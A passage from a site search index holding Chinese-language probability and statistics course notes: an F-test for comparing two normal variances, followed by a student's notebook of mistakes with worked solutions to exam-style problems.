<p>P-\u503c\u4e3a\uff1a</p> \\[ P\u503c= 2P\\{t(n_1 +n_2 -2) \\ge  |t_0|\\} \\]"},{"location":"Courses/PS/CH8/#_6","title":"\u6bd4\u8f83\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u65b9\u5dee\u7684\u68c0\u9a8c","text":"<p>\u6709\u65f6\u5019\uff0c\u5728\u68c0\u9a8c\u4e24\u6b63\u6001\u603b\u4f53\u5747\u503c\u524d\uff0c\u9700\u8981\u5148\u5bf9\u6b63\u6001\u603b\u4f53\u65b9\u5dee\u662f\u5426\u76f8\u7b49\u8fdb\u884c\u68c0\u9a8c\uff0c\u6211\u4eec\u8003\u8651\u4e0b\u9762\u7684\u5047\u8bbe\u95ee\u9898\uff1a</p> \\[ H_0: \\sigma_1^2 =\\sigma_2 ^2, \\ H_1: \\sigma_1 ^2 \\ne \\sigma_2^2 \\] <p>\u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf\u4e3a\uff1a</p> \\[ F=\\frac{S_1^2}{ S_2^2}  \\] <p>\u5f53\u539f\u5047\u8bbe \\(H_0\\) \u6210\u7acb\u65f6\uff0c\\(F\\sim F(n_1 -1, n_2-1)\\)\uff0c\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u4e3a\uff1a</p> \\[ W=\\{F\\ge F_{\\alpha / 2} (n_1 -1, n_2 -1)\\ \\text{or}\\ F\\le F_{1- \\alpha / 2} (n_1 -1, n_2-1 )\\} \\] <p>\u8bbe \\(p_0 = P\\{F(n_1-1, n_2-1) \\le f_0\\}\\)\uff0c\u5219\uff1a</p> <ul> <li>\u53cc\u8fb9\u68c0\u9a8c\uff1a \\(P\u503c=2\\min \\{p_0 , 1-p_0\\}\\)</li> <li>\u5de6\u4fa7\u68c0\u9a8c\uff1a \\(P\u503c= p_0\\)</li> <li>\u53f3\u4fa7\u68c0\u9a8c\uff1a \\(P\u503c= 1- p_0\\)</li> </ul>"},{"location":"Courses/PS/review/","title":"\u9519\u9898\u672c","text":""},{"location":"Courses/PS/review/#_1","title":"\u9519\u9898\u672c","text":"<p> \u7ea6 3634 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 18 \u5206\u949f</p>"},{"location":"Courses/PS/review/#chapter-1","title":"Chapter 1. \u6982\u7387\u8bba\u57fa\u672c\u6982\u7387","text":""},{"location":"Courses/PS/review/#_2","title":"\u591a\u753b\u56fe\u6c42\u89e3","text":"<p>\u5728\u533a\u95f4 \\((0,1)\\) \u5185\u968f\u673a\u53d6\u4e24\u4e2a\u6570\uff0c\u5219\u4e24\u6570\u4e4b\u548c\u5c0f\u4e8e \\(1/2\\) \u7684\u6982\u7387\u662f:</p> <p>\u89e3\u7b54\uff1a</p> \\[\\text{\u4f5c\u56fe\uff0c\u603b\u9762\u79ef\u4e3a} 1\\times 1,\\text{z=x+y \u5212\u5206\u6b63\u65b9\u4f53\u4e3a}\\frac{1}{2}\\times \\frac{1}{2} \\times \\frac{1}{2}=\\frac{1}{8}\\]"},{"location":"Courses/PS/review/#_3","title":"\u72ec\u7acb\u6027","text":"<p>\u9898\u9762\uff1a \u5df2\u77e5 \\(0\\lt P(A)P(B)\\lt 1\\) \uff0c\u5219\u4ee5\u4e0b\u6761\u4ef6\u6210\u7acb\u65f6 \\(A,B\\) \u4e00\u5b9a\u72ec\u7acb\uff1a</p> \\[ P(\\bar{A}|B)= P(\\bar{A}|\\bar{B}) \\] <p>\u89e3\u7b54\uff1a</p> <p>\u5c06 \\(P(\\bar{B}) = 1-P(B)\\) \u5e26\u5165\u53ef\u5f97\u5230 \\(P(\\bar{A}B) =P(\\bar{A})P(B)\\)</p> <p>\u9898\u9762\uff1a \u8bbe\u968f\u673a\u4e8b\u4ef6 \\(A,C\\) \u76f8\u4e92\u72ec\u7acb\uff0c\\(B,C\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219 \\(A\\cup B\\) \u4e0e \\(C\\) \u76f8\u4e92\u72ec\u7acb\u7684\u5145\u5206\u5fc5\u8981\u6761\u4ef6\u662f\uff1a</p> <ul> <li>A. \\(P(AB)=P(A)P(B)\\)</li> <li>B. \\(P(A\\cup B)= P(A) +P(B)\\)</li> <li>C. \\(AB, C\\) \u76f8\u4e92\u72ec\u7acb</li> <li>D. \\(AB,C\\) \u4e92\u4e0d\u76f8\u5bb9</li> </ul> <p>\u89e3\u7b54\uff1a</p> <p>\u9009C\uff0c\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u641e\u61c2\u3002</p>"},{"location":"Courses/PS/review/#_4","title":"\u53f3\u8fde\u7eed\u8fb9\u754c\u7684\u6982\u7387","text":"<p>\u9898\u9762\uff1a $$ F(x)=\\begin{cases}0, &amp; x\\lt 1 \\ \\frac{x}{4}, &amp; 1\\le x\\lt 2  \\  1, &amp; x\\le 2 \\end{cases} $$</p> <p>\u6c42 \\(P(X=2)\\)</p> <p>\u89e3\u7b54\uff1a</p> <p>\u56e0\u4e3a\u662f\u53f3\u8fde\u7eed\uff0c\u6240\u4ee5\uff1a</p> \\[ P(X=2)=F(x)-F(x-0)|_{x=2}= \\frac{1}{2} \\]"},{"location":"Courses/PS/review/#chapter-2","title":"Chapter 2. \u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":""},{"location":"Courses/PS/review/#_5","title":"\u6ce8\u610f\u6807\u51c6\u6b63\u6001\u5206\u5e03\u7684\u5bf9\u5e94\u5173\u7cfb","text":"<p>\u9898\u9762\uff1a \\(F(x)=0.5\\Phi(x) +0.5 \\Phi\\left(\\frac{x-4}{2}\\right)\\) \uff0c\u6c42 \\(E(x)\\)</p> <p>\u89e3\u7b54\uff1a \u8bbe \\(t=\\frac{x-4}{2}\\) \uff0c\u5219\u5bf9\u4e8e \\(\\Phi\\left(\\frac{x-4}{2}\\right)\\) \uff0c\\(x=2t+4 \\sim N(4,4)\\)\uff0c\u6240\u4ee5 \\(E(X) =0.5\\times 0+ 0.5\\times 4 =2\\)\u3002</p>"},{"location":"Courses/PS/review/#chapter-3","title":"Chapter 3. \u591a\u7ef4\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":""},{"location":"Courses/PS/review/#_6","title":"\u79bb\u6563\u578b\u548c\u8fde\u7eed\u578b\u7684\u8054\u5408\u5206\u5e03\u53ef\u4ee5\u7528\u5168\u6982\u7387\u516c\u5f0f","text":"<p>\u9898\u9762\uff1a \\(X\\sim N(0,1), Y\\)\u7684\u53d6\u503c\u662f\\(\\pm 1\\)\uff0c\u4e14\\(P\\{Y=1\\}=p\\)\uff0c\u82e5 \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u6c42\u8bc1 \\(Z=X\\cdot Y \\sim N(0,1)\\) </p> <p>\u89e3\u7b54\uff1a</p> \\[\\begin{array}c F_Z(t) = P(XY\\le t)=P(Y=1)P(X\\le t)+P(Y=-1)P(X\\ge -t)\\\\  =P(Y=1)F_X(t) +P(Y=-1) (1-F_X(-t)) \\\\  =pF_X(t) +(1-p) F_X(t) = F_X(t) \\end{array} \\] <p>\u9898\u9762\uff1a (\u6570\u4e00\u8003\u78142020) \u8bbe\u968f\u673a\u53d8\u91cf \\(X_1, X_2, X_3\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5176\u4e2d \\(X_1, X_2\\) \u5747\u670d\u4ece\u6807\u51c6\u6b63\u6001\u5206\u5e03\uff0c\\(X_3\\) \u670d\u4ece \\(P\\{X_3 =0\\}=P\\{ X_3=1\\} = \\frac{1}{2}\\)\uff0c\u4ee4 \\(Y=X_3 X_1 +(1-X_3) X_2\\) \uff0c\u6c42\uff1a</p> <ul> <li>&lt;1&gt; \u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X_1, Y)\\) \u7684\u5206\u5e03\u51fd\u6570</li> <li>&lt;2&gt; \u8bc1\u660e\u968f\u673a\u53d8\u91cf \\(Y\\) \u670d\u4ece\u6807\u51c6\u6b63\u6001\u5206\u5e03</li> </ul> <p>\u89e3\u7b54\uff1a</p> \\[\\begin{array}l F(x,y)&amp; =P\\{X_1 \\le x, Y\\le y\\} \\\\ &amp;= P\\{X_3=0\\} P\\{X_1 \\le x, X_2\\le y\\} +P\\{X_3 =1\\} P\\{X_1 \\le x, X_1\\le y\\} \\\\ &amp; = \\frac{1}{2}\\Phi(x)\\Phi(y) +  \\frac{1}{2}\\Phi(\\min (x,y)) \\\\ F(y) &amp; = \\lim_{x\\to +\\infty} F(x,y) =\\frac{1}{2}\\Phi(y) +\\frac{1}{2} \\Phi(y) = \\Phi(y)  \\end{array} \\]"},{"location":"Courses/PS/review/#_7","title":"\u867d\u7136\u770b\u8d77\u6765\u660e\u663e\u76f8\u5173\uff0c\u4f46\u662f\u4e5f\u53ef\u80fd\u662f\u540c\u5206\u5e03","text":"<p>\u7b54\u6848\u9009 ABD \u3002</p> <p>\u867d\u7136 \\(X_1, X_2\\) \u4e00\u773c\u4e0d\u72ec\u7acb\uff0c\u4f46\u662f\u5b9e\u9645\u8ba1\u7b97\u540e\u80fd\u53d1\u73b0\u4e8c\u8005\u5206\u5e03\u76f8\u540c\uff08\u540c\u65f6\u4e0e \\(Y_i\\) \u540c\u5206\u5e03\uff09</p>"},{"location":"Courses/PS/review/#_8","title":"\u4e24\u4e2a\u72ec\u7acb\u53d8\u91cf\u6bd4\u5927\u5c0f\uff0c\u7528\u8054\u5408\u5bc6\u5ea6\u51fd\u6570","text":"<p>\u9898\u9762\uff1a \u8bbe\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u4e14\u5206\u5e03\u670d\u4ece\u53c2\u6570\u5206\u522b\u4e3a 1,4 \u7684\u6307\u6570\u5206\u5e03\uff0c\u6c42 \\(P\\{X\\lt Y\\}\\)</p> <p>\u89e3\u7b54\uff1a </p> \\[\\begin{array}c f(x,y) =f_X(x) f_y(y) =\\begin{cases}4e^{-x-4y}, &amp; x\\gt 0,y\\gt0 \\\\ 0, &amp; \\text{\u5176\u4ed6}\\end{cases} \\\\  P\\{X\\lt Y\\} =\\iint_{x\\lt y} f(x,y) dxdy =\\frac{1}{5} \\end{array}\\]"},{"location":"Courses/PS/review/#_9","title":"\u548c\u5e38\u6570\u53d6\u6700\u5c0f\u503c\u7684\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\uff1f\uff1f\uff1f","text":"<p>\u9898\u9762\uff1a \u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda =1\\) \u7684\u6307\u6570\u5206\u5e03\uff0c\\(Y=\\min (X,2)\\)\uff0c\u6c42 \\(E(Y)\\)</p> <p>\u89e3\u7b54\uff1a </p> \\[ F_Y(y) =P(\\min (X,2)\\le y) = 1-P( \\min(X,2)\\gt y) = 1-P(X\\gt 2)P(y\\lt 2) =\\begin{cases}F_X(y), &amp; y\\lt 2\\\\ 1, &amp; y\\ge 2 \\end{cases} \\] <p>\u7136\u540e\u6c42\u5bfc\u6839\u636e\u5bc6\u5ea6\u51fd\u6570\u79ef\u5206\u5f97\u5230\u7ed3\u679c\u3002\u4e0d\u8fc7\u8fd9\u9898\u5b9e\u9645\u4e0a\u53ea\u7528\u6c42 \\(E(Y)\\)\uff0c\u56e0\u6b64\u76f4\u63a5\u4ee3\u5165\u6c42\u89e3\uff1a</p> \\[ E(Y)=\\int_{-\\infty}^{+\\infty} \\min (x,2) f(x)dx= \\int_0^2 xe^{-x}dx +\\int_2 ^{+\\infty} 2e^{-x}dx = e^{-2}+1 \\]"},{"location":"Courses/PS/review/#chapter-4","title":"Chapter 4. \u968f\u673a\u53d8\u91cf\u7684\u6570\u5b57\u7279\u5f81","text":""},{"location":"Courses/PS/review/#e-x2","title":"\\(e^{- x^2}\\) \u79ef\u5206","text":"<p>\u9898\u9762\uff1a \u968f\u673a\u53d8\u91cf\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(f(x)=\\begin{cases}2x^3 e^{- x^2}, &amp; 0\\le x \\\\ 0, &amp; \\text{else}\\end{cases}\\) \uff0c\u6c42 \\(D( \\frac{1}{X})\\)\u3002</p> <p>\u89e3\u7b54\uff1a \u8fd9\u9898\u601d\u8def\u5f88\u660e\u663e\uff0c\u4f46\u662f\u5b9e\u9645\u6c42\u79ef\u5206\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u8ff7\u7cca\u3002</p> \\[\\begin{array}c E( \\frac{1}{X})=\\int_0^{+\\infty} 2x^2 e^{- x^2}dx = -xe^{- x^2}|_0 ^{+\\infty} + \\int_0^{+\\infty} e^{-x ^2} dx = \\frac{\\sqrt{\\pi}}{2} \\\\ E\\left( \\frac{1}{X^2}\\right)= \\int_0^{+\\infty} 2x e^{- x^2}dx = 1 \\\\ \\Rightarrow D( \\frac{1}{X})= E\\left( \\frac{1}{X}^2\\right) -E\\left(\\frac{1}{X}\\right)^2 =1- \\frac{\\pi}{4} \\end{array} \\] <p>\u719f\u6089\u7279\u6b8a\u79ef\u5206(\u4e5f\u53ef\u4ee5\u4ece\u6807\u51c6\u6b63\u6001\u51fd\u6570\u6765\u770b\u5f85)</p> \\[\\int_{-\\infty}^{+\\infty} \\frac{1}{\\sqrt{2\\pi}}e^{-\\frac{x^2}{2}}=1 \\Rightarrow \\int_{0}^{+\\infty} e^{-x ^2}=\\frac{\\sqrt{\\pi}}{2}\\]"},{"location":"Courses/PS/review/#_10","title":"\u5bf9\u4e8e\u6709\u653e\u56de\uff0c\u4ece\u5355\u4e2a\u4e8b\u4ef6\u63a8\u5e7f\u5230\u6574\u4f53","text":"<p>\u9898\u9762\uff1a</p> <p>\u6709 n \u5f20\u5404\u4e0d\u76f8\u540c\u7684\u5361\u7247,\u91c7\u7528\u6709\u653e\u56de\u62bd\u6837,\u6bcf\u6b21\u53d6\u4e00\u5f20,\u5171\u53d6 n \u6b21,\u5219\u6709\u4e9b\u5361\u7247\u4f1a\u88ab\u53d6\u5230,\u751a\u81f3\u88ab\u53d6\u5230\u5f88\u591a\u6b21,\u4f46\u6709\u4e9b\u5361\u7247\u53ef\u80fd\u4e0d\u66fe\u88ab\u53d6\u5230.\u8bbe\u8fd9 n \u5f20\u5361\u7247\u4e2d\u88ab\u53d6\u5230\u7684\u5171\u6709 X \u5f20,\u8ba1\u7b97 \\(E(X)\\),\u5e76\u8ba1\u7b97\u5f53 \\(n \\rightarrow +\\infty\\) \u65f6\uff0c\\(E(X/n)\\)\u7684\u6781\u9650\uff1a</p> <p>\u89e3\u7b54\uff1a</p> <p>\u5b9a\u4e49\u6307\u793a\u53d8\u91cf \\(I_i\\)\uff0c\u8868\u793a\u7b2c \\(i\\) \u5f20\u5361\u7247\u662f\u5426\u88ab\u62bd\u5230\u8fc7\uff1a</p> \\[ I_i = \\begin{cases}  1 &amp; \\text{\u7b2c \\( i \\) \u5f20\u5361\u7247\u88ab\u53d6\u5230\u81f3\u5c11\u4e00\u6b21} \\\\ 0 &amp; \\text{\u5426\u5219} \\end{cases} \\] <p>\u5219\u88ab\u62bd\u5230\u7684\u5361\u7247\u603b\u6570 \\(X\\) \u53ef\u4ee5\u8868\u793a\u4e3a\u8fd9\u4e9b\u6307\u793a\u53d8\u91cf\u7684\u548c\uff1a</p> \\[ X = \\sum_{i=1}^n I_i \\] <p>\u73b0\u5728\u8ba1\u7b97 \\(E(X)\\)\uff0c\u5373 \\(E\\left( \\sum_{i=1}^n I_i \\right)\\)\u3002\u6839\u636e\u671f\u671b\u7684\u7ebf\u6027\u6027\uff0c\u6211\u4eec\u6709\uff1a</p> \\[ E(X) = \\sum_{i=1}^n E(I_i) \\] <p>\u8981\u8ba1\u7b97 \\(E(I_i)\\)\uff0c\u6211\u4eec\u5148\u8003\u8651\u7b2c \\(i\\) \u5f20\u5361\u7247\u5728 \\(n\\) \u6b21\u62bd\u53d6\u4e2d\u90fd\u6ca1\u6709\u88ab\u62bd\u5230\u7684\u6982\u7387\u3002\u6bcf\u6b21\u62bd\u5230\u8be5\u5361\u7247\u7684\u6982\u7387\u4e3a \\(\\frac{1}{n}\\)\uff0c\u56e0\u6b64\u7b2c \\(i\\) \u5f20\u5361\u7247\u5728\u67d0\u6b21\u62bd\u53d6\u4e2d\u4e0d\u88ab\u53d6\u5230\u7684\u6982\u7387\u4e3a \\(1 - \\frac{1}{n}\\) \u3002\u56e0\u6b64\uff0c\u7b2c \\(i\\) \u5f20\u5361\u7247\u5728 \\(n\\) \u6b21\u62bd\u53d6\u4e2d\u4ece\u672a\u88ab\u53d6\u5230\u7684\u6982\u7387\u4e3a\uff1a</p> \\[ P(I_i = 0) = \\left(1 - \\frac{1}{n}\\right)^n \\] <p>\u4e8e\u662f\uff0c\u7b2c \\(i\\) \u5f20\u5361\u7247\u81f3\u5c11\u88ab\u62bd\u5230\u4e00\u6b21\u7684\u6982\u7387\u4e3a\uff1a</p> \\[ P(I_i = 1) = 1 - \\left(1 - \\frac{1}{n}\\right)^n \\] <p>\u6240\u4ee5\uff0c</p> \\[ E(I_i) = P(I_i = 1) = 1 - \\left(1 - \\frac{1}{n}\\right)^n \\] <p>\u4ee3\u5165\u56de \\(E(X)\\) \u7684\u8868\u8fbe\u5f0f\uff1a</p> \\[ E(X) = \\sum_{i=1}^n \\left(1 - \\left(1 - \\frac{1}{n}\\right)^n\\right) = n \\left(1 - \\left(1 - \\frac{1}{n}\\right)^n\\right) \\] <p>\u5219 \\(E(X/n)\\) \u7684\u6781\u9650\uff1a</p> \\[ \\lim_{n \\to +\\infty} \\frac{E(X)}{n} = \\lim_{n \\to +\\infty} \\left(1 - e^{-1}\\right) = 1 - e^{-1} \\] <p>\u56e0\u6b64\uff0c\u5f53 \\(n \\to +\\infty\\) \u65f6\uff0c\\(E(X/n)\\) \u7684\u6781\u9650\u4e3a\uff1a</p> \\[ \\lim_{n \\to +\\infty} E(X/n) = 1 - e^{-1} \\approx 0.632 \\]"},{"location":"Courses/PS/review/#_11","title":"\u6c42\u5206\u5e03\u51fd\u6570\u7684\u5747\u503c\uff1f\u5176\u5b9e\u548c\u6c42\u53d8\u91cf\u51fd\u6570\u5747\u503c\u6ca1\u533a\u522b","text":"<p>\u9898\u9762\uff1a \u8bbe\u968f\u673a\u53d8\u91cf \\(X\\sim E( \\frac{1}{2})\\) \uff0c\u6c42 \\(E(F(X)^2+X)\\)</p> <p>\u89e3\u7b54\uff1a </p> \\[ E=\\int_{-\\infty}^{+\\infty} (F(x)^2+x) f(x)dx = \\frac{7}{3} \\]"},{"location":"Courses/PS/review/#_12","title":"\u51c6\u786e\u628a\u63e1\u534f\u65b9\u5dee\u7684\u6027\u8d28\u54e6","text":"<p>\u72ec\u7acb\u91cd\u590d\u629b\u786c\u5e01\uff0c\\(X\\) \u8868\u793a\u524d\u4e24\u6b21\u6b63\u9762\u7684\u6b21\u6570\uff0c\\(Y\\) \u8868\u793a\u524d\u56db\u6b21\u6b63\u9762\u7684\u6b21\u6570\uff0c\u6c42 \\(Cov(X,Y)\\)</p> <p>\u6b64\u9898\u53ef\u4ee5\u53e6\u8bbe\u968f\u673a\u53d8\u91cf \\(X'\\) \u4e3a\u540e\u4e24\u6b21\u6b63\u9762\u7684\u6b21\u6570\uff0c\u5219 \\(Y=X+X'\\)\uff0c\u4e14 \\(X'\\) \u4e0e \\(X\\) \u72ec\u7acb\uff1a</p> \\[ Cov(X,Y)= Cov(X,X+X')= Cov(X,X)= Var(X)=\\frac{1}{2} \\]"},{"location":"Courses/PS/review/#_13","title":"\u719f\u6089\u4e8c\u5143\u6b63\u6001\u5206\u5e03\u5404\u4e2a\u53c2\u6570\u542b\u4e49","text":"<p>\u9898\u9762\uff1a (\u6570\u4e00\u8003\u78142022) \u8bbe\u968f\u673a\u53d8\u91cf \\(X\\sim N(0,1)\\)\uff0c\u5728 \\(X=x\\) \u6761\u4ef6\u4e0b\uff0c\\(Y\\sim N(x,1)\\)\uff0c\u6c42 \\(X,Y\\) \u76f8\u5173\u7cfb\u6570\u3002</p> <p>\u89e3\u7b54\uff1a \u601d\u8def\u662f\u5148\u6c42\u8054\u5408\u5206\u5e03\uff0c\u518d\u5e26\u5165\u4e8c\u5143\u6b63\u6001\u5206\u5e03\u6a21\u677f\u6c42\u51fa\u53c2\u6570 \\(\\rho\\) </p> \\[\\begin{array}c f_X(x) =\\frac{1}{\\sqrt{2\\pi}} e^{- \\frac{x^2}{2}}, f_{Y|X}(y|x)=\\frac{1}{\\sqrt{2\\pi}} e^{-\\frac{(y-x) ^2}{2}} , \\\\ \\Rightarrow f(x,y)=f_X(x) f_{Y|X}(y|x)= \\frac{1}{2\\pi} e^{-\\frac{1}{2}(2x ^2 -2xy+ y^2)} \\\\ \\text{\u800c\u4e8c\u7ef4\u6b63\u6001\u5bc6\u5ea6\u51fd\u6570\u4e3a }(X,Y)\\sim f(x,y)\\sim N(\\mu_1 ,\\mu_2; \\sigma_1^2, \\sigma_2^2; \\rho) \\\\ f_1(x,y) = \\frac{1}{2\\pi \\sigma_1 \\sigma_2\\sqrt{1-\\rho ^2}} e^{-\\frac{1}{2(1-\\rho ^2)}\\left[\\frac{(x-\\mu_1) ^2}{\\sigma_1 ^2} - \\frac{2\\rho(x-\\mu_1) (y-\\mu_2)}{ \\sigma_1 \\sigma_2}+ \\frac{(y-\\mu_2) ^2}{\\sigma_2 ^2}\\right]}  \\\\ \\text{\u5bf9\u6bd4\u53ef\u5f97\uff1a} -\\frac{1}{2(1-\\rho^2)} \\frac{(x-\\mu_1)^2}{ \\sigma_1^2} = - \\frac{1}{2} \\cdot 2x^2 \\\\ \\text{\u5176\u4e2d} \\mu_1 =0, \\sigma_1^2 =1\\ \\Rightarrow \\ \\rho = \\frac{\\sqrt{2}}{2} \\end{array}\\] <p>\\(N(\\mu_1 ,\\mu_2; \\sigma_1^2, \\sigma_2^2; \\rho)\\)</p> <p>\u5206\u522b\u662f\u4e24\u4e2a\u53d8\u91cf\u7684\u5747\u503c\u3001\u65b9\u5dee\u548c\u76f8\u5173\u7cfb\u6570</p>"},{"location":"Courses/PS/review/#_14","title":"\u6c42\u4e24\u4e2a\u76f8\u5173\u6b63\u6001\u5dee\u503c\u7684\u5e73\u65b9\u7684\u5747\u503c\uff1f\uff1f\uff1f","text":"<p>\u9898\u9762\uff1a \u4e8c\u5143\u6b63\u6001\u603b\u4f53 \\((X,Y)\\sim N(0,0; \\sigma^2, 4\\sigma^2; -0.5)\\) \uff0c\u4ece\u4e2d\u62bd\u53d6 n \u4e2a\u7b80\u5355\u6837\u672c \\((X_i, Y_i)\\) \uff0c\u6c42 \\(\\frac{1}{n} \\sum_{i=1}^n (X_i -Y_i) ^2\\) \u4f9d\u6982\u7387\u6536\u655b\u5230\uff1f</p> <p>\u89e3\u7b54\uff1a \u4e0d\u80fd\u628a\u5e73\u65b9\u62c6\u6210 \\(X_i^2 -2 X_i Y_i + Y_i^2\\) \u6765\u5206\u522b\u6c42\u5747\u503c\uff0c\u56e0\u4e3a \\(E(X_i Y_i)\\) \u5e94\u8be5\u4e0d\u80fd\u6c42</p> \\[ \\frac{1}{n} \\sum_{i=1}^n (X_i -Y_i) ^2 =E[ (X- Y)^2] =D(X - Y) + E(X -Y)^2 = D(X) +D(Y)  - 2Cov(X, Y)= \\text{\u7565} \\]"},{"location":"Courses/PS/review/#chapter-5","title":"Chapter 5. \u5927\u6570\u5b9a\u5f8b\u548c\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":""},{"location":"Courses/PS/review/#_15","title":"\u968f\u673a\u53d8\u91cf\u4e58\u79ef\u7684\u65b9\u5dee","text":"<p>\u9898\u9762\uff1a</p> <p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X_i\\) \u7684\u5bc6\u5ea6\u51fd\u6570\u4e3a\uff1a</p> \\[ f_i(X)=\\begin{cases} \\frac{i|x|^{i-1}}{2}, &amp; |x|\\le 1  \\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{cases} ,\\ \\ \\ i=1,2,3,...,n \\] <p>\u4e14 \\(X_1, X_2, ...,X_n\\) \u76f8\u4e92\u72ec\u7acb\u3002\u4ee4 \\(Y_n = \\prod_{i=1}^n X_i\\) \uff0c\u7528\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\u6c42\u4f7f\u5f97 \\(P\\{|Y_n| \\ge \\frac{1}{2}\\} \\le \\frac{1}{9}\\) \u6210\u7acb\u7684\u6700\u5c0f \\(n\\) \u3002</p> <p>\u89e3\u7b54\uff1a</p> <p>\u5bf9\u4e8e\u4efb\u610f \\(i\\) \uff0c\u7531\u4e8e \\(xf_i(x)\\) \u4e3a\u5947\u51fd\u6570\uff0c\u6240\u4ee5 \\(E(X_i)=0\\) \uff0c\u540c\u65f6\u6709 \\(E(Y_n) =0\\)\u3002</p> <p>\u5f53 \\(X_i, X_j\\) \u76f8\u4e92\u72ec\u7acb\u65f6\uff0c\u6709\u5f15\u7406\uff1a</p> \\[ Var(X_i\\cdot X_j)=Var(X_i)Var (X_j) +Var(X_i) E(X_j)^2 +Var(X_j) E(X_i)^2 \\] <p>\u7531\u4e8e\u672c\u9898\u4e2d \\(E(X_i) =E(X_j) =0\\)</p> <p>\u6240\u4ee5\u6709\uff1a</p> \\[ Var(X_i\\cdot X_j) =Var(X_i)\\cdot Var(X_j) \\] <p>\u53c8\uff1a</p> \\[ \\begin{array}l Var(X_i)  &amp; =\\int _{-1}^1 (x-0)^2f(x)dx  \\\\ &amp; = \\int_{-1}^1 x^2 \\frac{i|x|^{i-1}}{2}dx  \\\\ &amp; = \\int _0^1 ix^{i+1}dx \\\\ &amp; = \\frac{i}{i+2} \\end{array}\\] <p>\u6240\u4ee5\uff1a</p> \\[ Var(Y_n)= \\prod_{i=1}^n X_i = \\frac{1}{1+2} \\cdot \\frac{2}{2+2} \\cdot \\frac{3}{3+2}... \\frac{n}{n+2} = \\frac{2}{(n+1)(n+2)} \\] <p>\u5e26\u5165\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff1a</p> \\[ P\\left(|Y_n| \\ge \\frac{1}{2}\\right) \\le \\frac{2\\cdot 2^2}{(n+1)(n+2)} \\le \\frac{1}{9} \\] <p>\u5f97 \\(n\\) \u6700\u5c0f\u503c\u4e3a 7\u3002</p>"},{"location":"Courses/PS/review/#_16","title":"\u95ee\u6709\u591a\u5c11\u628a\u63e1\uff0c\u80af\u5b9a\u662f\u8f6c\u6362\u6210\u6b63\u6001\u770b","text":"<p>\u95ee\u9898\uff1a</p> <p>\u968f\u673a\u53d8\u91cf \\(X\\) \u6ee1\u8db3\u4e09\u89d2\u5206\u5e03\uff1a</p> \\[ f(x)=\\begin{cases}x, &amp; 0\\le x \\lt 1 \\\\ 2-x, &amp; 1\\le x\\ \\lt 2 \\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{cases} \\] <p>\u8981\u4fdd\u8bc1\u81f3\u5c11\u6709 \\(95\\%\\) \u628a\u63e1\u4f7f\u4e8b\u4ef6 \\(\\{\\frac{1}{2} \\lt X \\lt \\frac{3}{2}\\}\\) \u51fa\u73b0\u6b21\u6570\u4e0d\u5c11\u4e8e 80 \uff0c\u5219\u9700\u8981\u81f3\u5c11\u591a\u5c11\u6b21\u89c2\u5bdf\uff1f</p> <p>\u89e3\u7b54\uff1a</p> \\[\\begin{array}c q=P\\left(\\frac{1}{2} \\lt X\\lt \\frac{3}{2}\\right)=\\frac{3}{4} \\\\ \\text{\u968f\u673a\u53d8\u91cfY\u4e3an\u6b21\u8bd5\u9a8c\u4e2d\u6ee1\u8db3\u6761\u4ef6\u7684\u6b21\u6570} \\\\ \\text{\u5219 } E(Y)=nq, D(Y)=nq(1-q) \\\\ Y\\sim N(nq, nq(1-q)) \\\\ 95\\% \\le P(Y\\ge 80) =1- \\Phi\\left(\\frac{80-nq}{\\sqrt{nq(1-q)}}\\right)\\\\ \\text{\u89e3\u5f97}  n=117 \\end{array}\\]"},{"location":"Courses/PS/review/#chapter-6","title":"Chapter 6. \u6570\u7406\u7edf\u8ba1\u7684\u57fa\u672c\u6982\u5ff5","text":""},{"location":"Courses/PS/review/#_17","title":"\u975e\u7ebf\u6027\u7684\u6837\u672c\u51fd\u6570\u7684\u6570\u5b66\u671f\u671b\u548c\u65b9\u5dee\u5229\u7528\u72ec\u7acb\u540c\u5206\u5e03\u6c42","text":"<p>\u9898\u76ee\uff1a</p> \\[ f(x) = \\begin{cases}\\lambda e^{-\\lambda x}, &amp; x\\gt 0 \\\\ 0, &amp; x\\le 0 \\end{cases} \\] <p>\u4ece\u603b\u4f53\u4e2d\u62bd\u53d6\u6837\u672c\u5bb9\u91cf\u4e3a 10 \u7684\u6837\u672c\u3002</p> <p>\uff081\uff09\u6c42\u6837\u672c\u5747\u503c\u7684\u6570\u5b66\u671f\u671b\u548c\u65b9\u5dee\u3002</p> <p>\uff082\uff09\u8bb0 \\(X_{(1)}=\\min (X_1, X_2,..., X_{10})\\)\uff0c\u6c42 \\(X_{(1)}\\) \u7684\u6570\u5b66\u671f\u671b\u548c\u65b9\u5dee\u3002</p> <p>\u89e3\u7b54</p> <p>\uff081\uff09\u76f4\u63a5\u5229\u7528 \\(E(\\bar{X}) = E(X), \\ \\ D(\\bar{X}) = \\frac{1}{n}D(X)\\) \u6c42\u5373\u53ef\uff1a</p> \\[ E(\\bar{X}) = E(X) = \\frac{1}{\\lambda} , D(\\bar{X})=\\frac{1}{10\\lambda^2} \\] <p>\uff082\uff09\u5229\u7528 min \u51fd\u6570\u7684\u6027\u8d28\u6c42 \\(F_{min}(X) = 1- (1- F(X))^{10}\\)\uff1a</p> \\[\\begin{array}l F(x)= \\begin{cases}0, &amp;  x\\le 0 